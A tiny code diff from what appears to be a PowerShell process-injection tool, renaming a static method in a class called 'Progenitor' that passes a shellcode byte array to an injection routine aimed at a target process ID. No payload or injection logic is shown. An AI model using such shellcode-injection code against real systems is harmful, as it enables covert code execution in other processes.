@@ -139,7 +139,7 @@ class Progenitor {
         return $true
     }
 
-    static [void]InjectDLL([byte[]]$shellcode) {
+    static [void]InjectShc([byte[]]$shellcode) {
         $cls = [Progenitor]
         $cls::InjectShc($shellcode, $cls::targetPID)
     }
